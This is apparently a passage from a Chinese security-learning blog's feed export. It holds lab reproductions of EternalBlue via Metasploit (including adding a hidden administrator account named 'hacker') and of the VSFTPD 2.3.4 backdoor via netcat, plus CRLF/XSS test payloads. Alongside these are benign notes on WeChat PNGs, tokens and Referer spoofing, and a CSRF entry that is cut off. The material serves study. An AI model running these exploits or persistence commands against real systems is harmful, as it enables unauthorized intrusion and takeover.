靶机ip（设置扫描主机ip）</span><br><span class="line">run（运行）</span><br></pre></td></tr></table></figure><p><img src="D:/Typora/img/image-20241218235702724.png" alt="image-20241218235702724"></p><p>发现开启了139和445端口</p><h2 id="msf进行漏洞利用"><a href="#msf进行漏洞利用" class="headerlink" title="msf进行漏洞利用"></a>msf进行漏洞利用</h2><p>msf搜索永恒之蓝漏洞</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">msfconsole</span><br><span class="line">search ms17-010</span><br></pre></td></tr></table></figure><p><img src="D:/Typora/img/image-20241219001631822.png" alt="image-20241219001631822"></p><p>有五个可以利用的模块</p><p>模块3是一个检测是否存在ms17-010的模块，使用模块3对靶机进行漏洞检测，使用show options 查看参数</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">use 3</span><br><span class="line">show options</span><br></pre></td></tr></table></figure><p>显示主机需要设置，且这里为空，我们设置主机</p><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/image-20241231002557504.png" alt="image-20241231002557504"></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">set rhosts 192.168.174.138</span><br></pre></td></tr></table></figure><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/image-20241231002702775.png" alt="image-20241231002702775"></p><p>run开始攻击</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">run</span><br></pre></td></tr></table></figure><p>存在漏洞</p><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/image-20241231002744509.png" alt="image-20241231002744509"></p><p>接下来使用模块0进行攻击</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">use 0</span><br><span class="line">show options</span><br><span class="line">set rhosts 192.168.174.138</span><br><span class="line">run</span><br></pre></td></tr></table></figure><p>攻击成功</p><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/image-20241231003248500.png" alt="image-20241231003248500"></p><p>输入shell就可以获得靶机权限</p><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/image-20241231003320074.png" alt="image-20241231003320074"></p><h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><p>创建一个用户，切记密码复杂度达到符合windows安全验证的密码。才可创建成功。</p><p>这里创建用户hacker，密码为A#123456</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">net user hacker A#123456 /add</span><br></pre></td></tr></table></figure><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/image-20241231003711366.png" alt="image-20241231003711366"></p><p>将创建好的用户拉进超级管理组</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">net localgroup Administrators hacker /add</span><br></pre></td></tr></table></figure><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/image-20241231003810632.png" alt="image-20241231003810632"></p><p>查看超级管理组中存在hacker</p><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/image-20241231003833212.png" alt="image-20241231003833212"></p><p>后续使用本机远程桌面连接</p><p>在windows本机win+R 输入mstsc，启用远程连接目标靶机，连接我们创建的hacker用户即可</p>]]></content>
      
      
      <categories>
          
          <category> 漏洞复现 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 靶场 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>笑脸漏洞复现.md</title>
      <link href="/2025/05/27/%E7%AC%91%E8%84%B8%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
      <url>/2025/05/27/%E7%AC%91%E8%84%B8%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/</url>
      
        <content type="html"><![CDATA[<h1 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h1><p>漏洞服务：VSFTPD 2.3.4，俗称笑脸漏洞。存在于这个2.3.4版本，属于开发者设计上的失误。在检测到用户名带有特殊字符：）时，会自动打开6200端口。</p><p>靶机（Metasploitable2）ip：192.168.174.137</p><p>攻击机（kali）ip：192.168.174.130</p><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/image-20241230225952262.png" alt="image-20241230225952262"></p><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/image-20241230225924501.png" alt="image-20241230225924501"></p><h1 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h1><p>nmap扫描靶机端口状态</p><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/image-20241230230329661.png" alt="image-20241230230329661"></p><p>开启了21号端口</p><p>继续扫描ftp服务版本号</p><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/image-20241230230454488.png" alt="image-20241230230454488"></p><p>版本号为vsftpd2.3.4，符合漏洞条件</p><h2 id="复现方式一：nc监听"><a href="#复现方式一：nc监听" class="headerlink" title="复现方式一：nc监听"></a>复现方式一：nc监听</h2><p>利用瑞士小军刀（netcat），连接靶机的21端口，输入user带有：），pass随便输入。<br>例如：user a：） pass 123456</p><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/image-20241230231008604.png" alt="image-20241230231008604"></p><p>此窗口不关闭，新开命令窗口测试6200端口是否开放</p><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/image-20241230231045530.png" alt="image-20241230231045530"></p><p>发现6200端口开放</p><p>nc连接6200端口，成功获得root权限</p><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/image-20241230231119214.png" alt="image-20241230231119214"></p><h2 id="复现方式二：msf复现"><a href="#复现方式二：msf复现" class="headerlink" title="复现方式二：msf复现"></a>复现方式二：msf复现</h2><p>kali运行msfconsole进入msf</p><p>输入<code>search vsftpd</code></p><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/image-20241230231536006.png" alt="image-20241230231536006"></p><p>输入<code>use 1</code>使用该模块</p><p>输入<code>info</code>查看配置信息，需要配置主机ip</p><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/image-20241230231719026.png" alt="image-20241230231719026"></p><p>配置靶机ip</p><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/image-20241230231804883.png" alt="image-20241230231804883"></p><p>输入<code>run</code>开始攻击，成功getshell</p><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/image-20241230231936853.png" alt="image-20241230231936853"></p>]]></content>
      
      
      <categories>
          
          <category> 漏洞复现 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 靶场 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>微信传输png文件无法保持原理透明格式问题</title>
      <link href="/2025/05/27/%E5%BE%AE%E4%BF%A1%E4%BC%A0%E8%BE%93png%E6%96%87%E4%BB%B6%E6%97%A0%E6%B3%95%E4%BF%9D%E6%8C%81%E5%8E%9F%E7%90%86%E9%80%8F%E6%98%8E%E6%A0%BC%E5%BC%8F%E9%97%AE%E9%A2%98/"/>
      <url>/2025/05/27/%E5%BE%AE%E4%BF%A1%E4%BC%A0%E8%BE%93png%E6%96%87%E4%BB%B6%E6%97%A0%E6%B3%95%E4%BF%9D%E6%8C%81%E5%8E%9F%E7%90%86%E9%80%8F%E6%98%8E%E6%A0%BC%E5%BC%8F%E9%97%AE%E9%A2%98/</url>
      
        <content type="html"><![CDATA[<h1 id="微信对透明背景的支持有限"><a href="#微信对透明背景的支持有限" class="headerlink" title="微信对透明背景的支持有限"></a>微信对透明背景的支持有限</h1><p>在我搭建个人博客时，有一个图片需要手动ps改一下，原图如下，要把左下角的2020 p成 2022</p><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/644287166329b.png" alt="644287166329b"></p><blockquote><p>不会ps啊，找万能朋友圈吧</p></blockquote><p>我用微信把图片发过去之后，朋友帮我p好了，再发给我，我发现了端倪</p><blockquote><p>这怎么发过去的时候是透明的，回来的时候给我搞了个白色背景</p></blockquote><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/83feedf72fbd42f26b3232ccd91d5ed.png" alt="83feedf72fbd42f26b3232ccd91d5ed"></p><p>起初我还以为是朋友的问题，又找了另一个朋友，发现也存在这个问题，于是我检查了一下我发送给我朋友的原图，用手机看了一下试试，发现原来是我的问题…（发送过去就是有白色背景的）</p><p>为什么在我电脑中这个源文件是透明背景，但是发送之后会自动被添加一个白色背景？</p><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/3d2fc2d271c1a2a5ecedbdaf1e67205.png" alt="3d2fc2d271c1a2a5ecedbdaf1e67205"></p><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/image-20250527092723426.png" alt="image-20250527092723426"></p><p>原来是微信的问题…（但是这里第一条可能有些问题，因为我发送的是png，对方接收到的也是png，不可能微信给我自动从png转到jpg再转到png吧）</p><p>也就是说，虽然发送之前是png，对方收到的也是png，但是微信会把包含透明背景的图片全部填充为白色</p><p><strong>微信对透明背景的支持有限</strong></p><p>去搜了一下解决办法</p><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/image-20250527093016518.png" alt="image-20250527093016518"></p><p>模棱两可，我选择用QQ（经过尝试QQ可以正常发送和接收透明背景的png图片）</p>]]></content>
      
      
      <categories>
          
          <category> 日常生活 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 日常生活 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>什么是token？</title>
      <link href="/2025/05/27/%E4%BB%80%E4%B9%88%E6%98%AFtoken%EF%BC%9F/"/>
      <url>/2025/05/27/%E4%BB%80%E4%B9%88%E6%98%AFtoken%EF%BC%9F/</url>
      
        <content type="html"><![CDATA[<p>toke的意思是“<font style="color:#DF2A3F;">令牌</font>”，是服务端生成的一串字符串，作为客户端进行请求的一个<font style="color:#DF2A3F;">标识</font>。</p><p>当用户第一次登录后，服务器生成一个token,并将此token返回给客户端，</p><p>以后客户端只需带上这个tokn前来请求数据即可，无需再次带上用户名和密码。</p><hr><p>简单token的组成：</p><ul><li>uid(用户唯一的身份标识)、</li><li>time(当前时间的时间戳)、</li><li>sign(签名：将请求URL、时间戳、uid进行一定的算法加密)</li></ul><p>token是可校验的</p><blockquote><p>去其他地方时，其他地方给的会员卡，会员卡就相当于token</p></blockquote><p><img src="https://cdn.nlark.com/yuque/0/2024/png/39123326/1714658910447-d4f44475-e1ee-42fc-a95e-6415bd830622.png"></p><hr><p>优点：</p><p>1、与session对比，可以跨服务器</p><p>2、避免cookie存储遭受CSRF(跨站请求伪造的攻击)</p><p>以及cookie跨域限制问题（同源策略）</p><hr><p>JWT区别：（现在常用的时JWT，之前常用的是token）</p><p>JWT：Json Web Token</p><p>有自己的一套规则</p><blockquote><p>是无状态的，不用将token存储在内存或者db中</p><p>也不用自己另外去储存过期时间</p></blockquote><p>token在校验用户名密码时，会存储在数据库中，并设置存储时间，校验时会比较存储时间</p>]]></content>
      
      
      <categories>
          
          <category> Tips </category>
          
      </categories>
      
      
        <tags>
            
            <tag> HTTP </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>什么是Referer？</title>
      <link href="/2025/05/27/%E4%BB%80%E4%B9%88%E6%98%AFReferer%EF%BC%9F/"/>
      <url>/2025/05/27/%E4%BB%80%E4%B9%88%E6%98%AFReferer%EF%BC%9F/</url>
      
        <content type="html"><![CDATA[<h1 id="什么是Referer？"><a href="#什么是Referer？" class="headerlink" title="什么是Referer？"></a>什么是Referer？</h1><p><a href="https://www.sojson.com/tag_referer.html">Referer</a>是<a href="https://www.sojson.com/tag_http.html">HTTP</a>请求header的一部分，当浏览器（或者模拟浏览器行为）向web服务器发送请求的时候，头信息里有包含<a href="https://www.sojson.com/tag_referer.html">Referer</a>。比如我在<a href="http://www.sojson.com里有一个www.baidu.com链接，那么点击这个www.baidu.com，它的header信息里就有：">www.sojson.com里有一个www.baidu.com链接，那么点击这个www.baidu.com，它的header信息里就有：</a></p><p>Referer&#x3D;<a href="https://www.sojson.com/">https://www.sojson.com</a></p><p>由此可以看出来吧。它就是表示一个来源。看下图的一个请求的<a href="https://www.sojson.com/tag_referer.html">Referer</a>信息。</p><p><img src="https://cdn.nlark.com/yuque/0/2024/png/39123326/1714659909921-27c04e34-096c-44c7-92c9-4475f60fd8c8.png"></p><h3 id="这里有一个小问题要说明下。"><a href="#这里有一个小问题要说明下。" class="headerlink" title="这里有一个小问题要说明下。"></a>这里有一个小问题要说明下。</h3><p><a href="https://www.sojson.com/tag_referer.html">Referer</a>的正确英语拼法是referrer。由于早期HTTP规范的拼写错误，为了保持向后兼容就将错就错了。其它网络技术的规范企图修正此问题，使用正确拼法，所以目前拼法不统一。还有它第一个字母是大写。</p><h1 id="Referer的作用？"><a href="#Referer的作用？" class="headerlink" title="Referer的作用？"></a>Referer的作用？</h1><p>1.防盗链。</p><p>刚刚前面有提到一个小<a href="https://www.sojson.com/tag_demo.html">Demo</a>。</p><p>我在<a href="http://www.sojson.com里有一个www.baidu.com链接，那么点击这个www.baidu.com，它的header信息里就有：">www.sojson.com里有一个www.baidu.com链接，那么点击这个www.baidu.com，它的header信息里就有：</a>  </p><p>Referer&#x3D;<a href="https://www.sojson.com/">https://www.sojson.com</a></p><p>那么可以利用这个来防止盗链了，比如我只允许我自己的网站访问我自己的图片服务器，那我的域名是<a href="http://www.sojson.com,那么图片服务器每次取到referer来判断一下是不是我自己的域名www.sojson.com,如果是就继续访问,不是就拦截./">www.sojson.com，那么图片服务器每次取到Referer来判断一下是不是我自己的域名www.sojson.com，如果是就继续访问，不是就拦截。</a></p><p>这是不是就达到防盗链的效果了？</p><p>2.防止恶意请求。</p><p>比如我的SOJSON网站上，静态请求是*.html结尾的，动态请求是*.shtml，那么由此可以这么用，所有的*.shtml请求，必须<a href="https://www.sojson.com/tag_referer.html">Referer</a>为我自己的网站。</p><p>Referer&#x3D;<a href="https://www.sojson.com/">https://www.sojson.com</a></p><h1 id="空Referer是怎么回事？什么情况下会出现Referer"><a href="#空Referer是怎么回事？什么情况下会出现Referer" class="headerlink" title="空Referer是怎么回事？什么情况下会出现Referer?"></a>空Referer是怎么回事？什么情况下会出现Referer?</h1><p>首先，我们对空<a href="https://www.sojson.com/tag_referer.html">Referer</a>的定义为，<a href="https://www.sojson.com/tag_referer.html">Referer</a>头部的内容为空，或者，一个<a href="https://www.sojson.com/tag_http.html">HTTP</a>请求中根本不包含<a href="https://www.sojson.com/tag_referer.html">Referer</a>头部。</p><p>那么什么时候<a href="https://www.sojson.com/tag_http.html">HTTP</a>请求会不包含<a href="https://www.sojson.com/tag_referer.html">Referer</a>字段呢？根据Referer的定义，它的作用是指示一个请求是从哪里链接过来，那么当一个请求并不是由链接触发产生的，那么自然也就不需要指定这个请求的链接来源。</p><p>比如，直接在浏览器的地址栏中输入一个资源的URL地址，那么这种请求是不会包含<a href="https://www.sojson.com/tag_referer.html">Referer</a>字段的，因为这是一个“凭空产生”的<a href="https://www.sojson.com/tag_http.html">HTTP</a>请求，并不是从一个地方链接过去的。  </p><h3 id="那么在防盗链设置中，允许空Referer和不允许空Referer有什么区别？"><a href="#那么在防盗链设置中，允许空Referer和不允许空Referer有什么区别？" class="headerlink" title="那么在防盗链设置中，允许空Referer和不允许空Referer有什么区别？"></a>那么在防盗链设置中，允许空Referer和不允许空Referer有什么区别？</h3><p>允许<a href="https://www.sojson.com/tag_referer.html">Referer</a>为空，意味着你允许比如浏览器直接访问，就是空。</p><p>如下图：</p><p><img src="https://cdn.nlark.com/yuque/0/2024/png/39123326/1714659910652-613de8c6-e863-4c21-bebd-56fca703af5a.png"></p><p>这就是空的<a href="https://www.sojson.com/tag_referer.html">Referer</a>。</p><p>拒绝空的<a href="https://www.sojson.com/tag_referer.html">Referer</a>。比如我的<a href="http://www.sojson.com的静态资源都是拒绝空的referer的.如下图,我访问我的一个图片./">www.sojson.com的静态资源都是拒绝空的Referer的。如下图，我访问我的一个图片。</a>  </p><p><img src="https://cdn.nlark.com/yuque/0/2024/png/39123326/1714659911074-dec381b8-1a33-44b4-8930-d452207a61ea.png"></p><p>看到了吧，直接拒绝访问了，如果有同学在测试我网站的静态资源的时候，记住强制刷新Ctrl + F5，因为浏览器有缓存，可能你开始还是可以访问的。</p><p>当然。这个你不能完全依赖<a href="https://www.sojson.com/tag_referer.html">Referer</a>来做一些事情，因为这个最容易伪造来源。</p><p>每个语言，都可以，比如<a href="https://www.sojson.com/tag_java.html">Java</a>来模拟一个<a href="https://www.sojson.com/tag_httpclient.html">Httpclient</a>请求。并且伪造来源。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/**</span><br><span class="line"> * 从工信部获取验证码</span><br><span class="line"> * @param session</span><br><span class="line"> * @param response</span><br><span class="line"> */</span><br><span class="line">public static void getVCode(HttpSession session,HttpServletResponse response)&#123;</span><br><span class="line"></span><br><span class="line">InputStream inputStream = null;</span><br><span class="line">ServletOutputStream outStream = null;</span><br><span class="line">try &#123;</span><br><span class="line"> //获取登录框的隐含参数 type=&quot;hidden&quot; name=&quot;_xsrf&quot;  </span><br><span class="line">    HttpClient client = new HttpClient();</span><br><span class="line">client.getParams().setParameter(HttpMethodParams.HTTP_CONTENT_CHARSET,&quot;UTF-8&quot;);</span><br><span class="line">client.getParams().setCookiePolicy(CookiePolicy.BROWSER_COMPATIBILITY);</span><br><span class="line">GetMethod method = new GetMethod(&quot;http://www.miitbeian.gov.cn/getVerifyCode&quot;);</span><br><span class="line">method.setRequestHeader(&quot;Connection&quot;,&quot;close&quot;);</span><br><span class="line">method.setRequestHeader(&quot;Host&quot;, &quot;www.miitbeian.gov.cn&quot;);</span><br><span class="line">method.setRequestHeader(&quot;Referer&quot;, &quot;http://www.miitbeian.gov.cn/icp/publish/query/icpMemoInfo_showPage.action&quot;);</span><br><span class="line">method.setRequestHeader(&quot;User-Agent&quot;, &quot;Mozilla/5.0 (Windows NT 6.1; WOW64; rv:42.0) Gecko/20100101 Firefox/42.0&quot;);</span><br><span class="line">//method.setRequestHeader(&quot;Cookie&quot;, (String)goon);</span><br><span class="line">client.executeMethod(method);</span><br><span class="line">Cookie[] cookies = client.getState().getCookies();</span><br><span class="line">String sid = &quot;&quot;,uid=&quot;&quot;,goon=&quot;__jsluid=%s; JSESSIONID=%s&quot;;</span><br><span class="line">for (Cookie cookie : cookies) &#123;</span><br><span class="line">String name = cookie.getName();</span><br><span class="line">String value = cookie.getValue();</span><br><span class="line">if(&quot;JSESSIONID&quot;.equals(name))&#123;</span><br><span class="line">sid = value;</span><br><span class="line">&#125;</span><br><span class="line">if(&quot;__jsluid&quot;.equals(name))&#123;</span><br><span class="line">uid = value;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">goon = String.format(goon, uid,sid);</span><br><span class="line">//存储工信部Session信息</span><br><span class="line">session.setAttribute(&quot;goon&quot;, goon);</span><br><span class="line"></span><br><span class="line">inputStream= method.getResponseBodyAsStream();</span><br><span class="line"> //得到图片的二进制数据，以二进制封装得到数据，具有通用性  </span><br><span class="line">    byte[] data = CacheFindManager.readInputStream(inputStream);  </span><br><span class="line">    outStream = response.getOutputStream();</span><br><span class="line">    outStream.write(data);</span><br><span class="line">    outStream.flush() ;</span><br><span class="line"></span><br><span class="line">&#125; catch (Exception e) &#123;</span><br><span class="line">LoggerUtils.error(BeianGovManager.class, &quot;获取验证码出现异常。&quot;, e);</span><br><span class="line">&#125;finally&#123;</span><br><span class="line">try &#123;</span><br><span class="line">inputStream.close();</span><br><span class="line">outStream.close();</span><br><span class="line">&#125; catch (IOException e) &#123;</span><br><span class="line">LoggerUtils.error(BeianGovManager.class, &quot;获取验证码后，关闭流出现异常，请忽略！&quot;, e);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Tips </category>
          
      </categories>
      
      
        <tags>
            
            <tag> HTTP </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>安卓模拟器安装xposed遇到问题</title>
      <link href="/2025/05/27/%E5%AE%89%E5%8D%93%E6%A8%A1%E6%8B%9F%E5%99%A8%E5%AE%89%E8%A3%85xposed%E9%81%87%E5%88%B0%E9%97%AE%E9%A2%98/"/>
      <url>/2025/05/27/%E5%AE%89%E5%8D%93%E6%A8%A1%E6%8B%9F%E5%99%A8%E5%AE%89%E8%A3%85xposed%E9%81%87%E5%88%B0%E9%97%AE%E9%A2%98/</url>
      
        <content type="html"><![CDATA[<p>我在看小迪的课时，看到模拟器安装xp，我在跟着操作时遇到了问题</p><p>在执行<em>sh script.sh</em>时产生了报错</p><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/image-20250322184424322.png"></p><p>似乎是模拟器安卓版本不同，SDK版本不同造成的问题</p><blockquote><p>这个工具是使用的SDK版本更低</p></blockquote><p>使用多开器新建一个7.1的安装</p><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/image-20250322184545256.png" alt="image-20250322184545256"></p><p>按照正常安装步骤</p><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/image-20250322185515137.png" alt="image-20250322185515137"></p><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/image-20250322185627124.png" alt="image-20250322185627124"></p><blockquote><p>需要重启</p></blockquote><p>通过xp来解除SSL证书单向检验</p><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/image-20250322185659244.png" alt="image-20250322185659244"></p><blockquote><p>需要重启</p></blockquote><p><strong>成功安装证明</strong></p><p>靶场反证书校验绕过</p><blockquote><p>由于使用了xp并且使用了解除SSL证书单向检验的插件，成功抓到数据包</p></blockquote><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/image-20250322213358397.png" alt="image-20250322213358397"></p>]]></content>
      
      
      <categories>
          
          <category> Tips </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 环境搭建 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CRLF注入</title>
      <link href="/2025/05/27/CRLF%E6%B3%A8%E5%85%A5/"/>
      <url>/2025/05/27/CRLF%E6%B3%A8%E5%85%A5/</url>
      
        <content type="html"><![CDATA[<h1 id="漏洞介绍"><a href="#漏洞介绍" class="headerlink" title="漏洞介绍"></a>漏洞介绍</h1><p>CRLF是CR和LF两个字符的拼接，它们分别代表”回车+换行”（\r\n）“，全称为Carriage Return&#x2F;Line Feed”，十六进制编码分别为0x0d和0x0a，URL编码为%0D和%0A。CR和LF组合在一起即CRLF命令，它表示键盘上的”Enter”键，许多应用程序和网络协议使用这些命令作为分隔符。</p><p>而在HTTP协议中，HTTP header之间是由一个CRLF字符序列分隔开的，HTTP Header与Body是用两个CRLF分隔的，浏览器根据这两个CRLF来取出HTTP内容并显示出来。</p><p>所以如果用户的输入在HTTP返回包的Header处回显，便可以通过CRLF来提前结束响应头，在响应内容处注入攻击脚本。因此CRLF Injection又叫HTTP响应拆分&#x2F;截断（HTTP Response Splitting）简称HRS。</p><p>CRLF注入漏洞的本质和XSS有点相似，攻击者将恶意数据发送给易受攻击的Web应用程序，Web应用程序将恶意数据<strong>输出在HTTP响应头</strong>中。（XSS一般输出在主体中）</p><h1 id="测试思路"><a href="#测试思路" class="headerlink" title="测试思路"></a>测试思路</h1><blockquote><p><strong>找到输入点，构造恶意的CRLF字符</strong></p></blockquote><p>正常请求</p><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/1557114542_5ccfaeae44583.jpeg" alt="1-CRLF.jpg"></p><p>抓包，在请求行的url参数中加入特殊构造的CRLF字符，如下图标记所示。</p><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/1557114547_5ccfaeb316619.jpeg" alt="2-CRLF.jpg"></p><blockquote><p><strong>查看恶意数据是否在响应头中输出</strong></p></blockquote><p>将修改后的请求包提交给服务器端，查看服务器端的响应。发现响应首部中多了个Set-Cookie字段。这就证实了该系统存在CRLF注入漏洞，因为我们输入的恶意数据，作为响应首部字段返回给了客户端。</p><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/1557114552_5ccfaeb82a763.jpeg" alt="3-CRLF.jpg"></p><h2 id="手工测试payload"><a href="#手工测试payload" class="headerlink" title="手工测试payload"></a>手工测试payload</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">%0aSet-cookie:JSPSESSID%3Ddrops  </span><br><span class="line">%0d%0a%0d%0a&lt;img src=1 onerror=alert(/xss/)&gt;/</span><br></pre></td></tr></table></figure><h1 id="工具-CRLFFuzz"><a href="#工具-CRLFFuzz" class="headerlink" title="工具-CRLFFuzz"></a>工具-CRLFFuzz</h1><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/7fee095f8ccb35b5cb41bd677d0d343e.png" alt="在这里插入图片描述"><br><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/1eb0941ae4649937063086b1984558ba.png" alt="在这里插入图片描述"><br><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/09ea7c26397f8310ef36f56981996d76.png" alt="在这里插入图片描述"><br>没有漏洞payload测试<br><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/10845761d2d8e17aeb7509dee4c5429d.png" alt="在这里插入图片描述"><br><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/d39b9de1d4e21ca3b30e0310307df5ff.png" alt="在这里插入图片描述"><br>有漏洞payload测试<br><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/9df3971ae407a3cf7c42907c85868da7.png" alt="在这里插入图片描述"><br><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/164c6643cdb3e2a09d686e5f81dbb4c6.png" alt="在这里插入图片描述"></p>]]></content>
      
      
      <categories>
          
          <category> OWASP </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CRLF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CSRF</title>
      <link href="/2025/05/27/CSRF/"/>
      <url>/2025/05/27/CSRF/</url>
      
        <content type="html"><![CDATA[<h1 id="同源策略"><a href="#同源策略" class="headerlink" title="同源策略"></a>同源策略</h1><p>在web浏览器中，允许某个网页脚本访问另一个网页的数据，但前提是这两个网页必须同源。不同源的客户端脚本在没有明确授权的情况下，不能读写对方的资源，比如Cookie等。同源策略是一种安全思想，但并不是统一的规范体系</p><p><a href="https://blog.csdn.net/l_ppp/article/details/106402136">前端人员都懂的浏览器的同源策略，以及如何进行不同源间的相互访问_浏览器同源策略可怎么深问-CSDN博客</a></p><p>同源：协议、域名、端口 都相同</p><h1 id="CSRF"><a href="#CSRF" class="headerlink" title="CSRF"></a>CSRF</h1><h2 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h2><p>跨站请求伪造，是一种通过挟持当前用户已登录的web应用程序从而实现非用户本意的操作的攻击方法。</p><p>攻击者通过一些技术手段，挟持用户去访问用户曾经认证过的网站并进行一些操作（例如发邮件、发信息、转账等）。由于浏览器曾经认证过，所以被访问的网站会认为是真正用户所进行的操作而去执行</p><p>与XSS相比来说，XSS可以获取用户凭证（Cookie），而CSRF只是利用用户凭证在用户不知情的情况下执行某些操作，通俗的说XSS可以执行任意JS，而CSRF只是请求伪造而已</p><h2 id="成因"><a href="#成因" class="headerlink" title="成因"></a>成因</h2><p>没有检查Referer请求头</p><p>没有在头部设置token</p><h2 id="危害"><a href="#危害" class="headerlink" title="危害"></a>危害</h2><p>盗取账号，以用户名义发邮件、发消息、购买商品、转账</p><p>（CSRF能做什么，取决于网站能够做什么）</p><h2 id="攻击流程"><a href="#攻击流程" class="headerlink" title="攻击流程"></a>攻击流程</h2><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/1726050366182-fb597a4e-5e84-49c5-af2c-6bb978aa547c.png"></p><blockquote><p>1.用户C打开浏览器，访问受信任网站A,输入用户名和密码请求登录网站A;</p><p>2.在用户信息通过验证后，网站A产生Cookie信息并返回给浏览器，此时用户登录网站A成功，可以正常发送请求到网站A;</p><p>3.用户未退出网站A之前，在同一浏览器中，打开一个TAB页访问网站B;</p><p>4.网站B接收到用户请求后，返回一些攻击性代码，并发出一个请求要求访问第三方站点A:</p><p>5.浏览器在接收到这些攻击性代码后，根据网站B的请求，在用户不知情的情况下携带Cookie信息，向网站A发出请求。网站A并不知道该请求其实是由B发起的，所以会根据用户C的Cookie信息以C的权限处理该请求，导致来自网站B的恶意请求被执行。</p><p>本质：利用cookie在同源请求中携带发送给服务器的特点，来实现冒充用户。</p></blockquote><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/1726050571783-1e436ae9-0e6f-44b1-aca4-6ddc9a4e18be.png"></p><h2 id="CSRF三要素"><a href="#CSRF三要素" class="headerlink" title="CSRF三要素"></a>CSRF三要素</h2><ol><li>操作</li></ol><p>想让受害者做什么，转账、修改密码等</p><ol start="2"><li>认证</li></ol><p>基于Cookie的会话处理</p><ol start="3"><li>没有不可预测的参数</li></ol><p>因为要事先构造请求，所以不能有不可预期的参数，比如密码等</p><h3 id="示例"><a href="#示例" class="headerlink" title="示例"></a>示例</h3><p>一个修改绑定邮箱的请求包</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">POST /email/change HTTP/1.1 </span><br><span class="line">Host: vulnerable-website.com </span><br><span class="line">Content-Type: application/x-www-form-urlencoded </span><br><span class="line">Cookie: session=yvthwsztyeQkAPzeQ5gHgTvlyxHfsAfE</span><br><span class="line">Content-Length: 30 </span><br><span class="line"></span><br><span class="line">email=wiener@normal-user.com</span><br></pre></td></tr></table></figure><p>如果网站里存在CSRF，就可以构造Poc</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">&lt;body&gt; 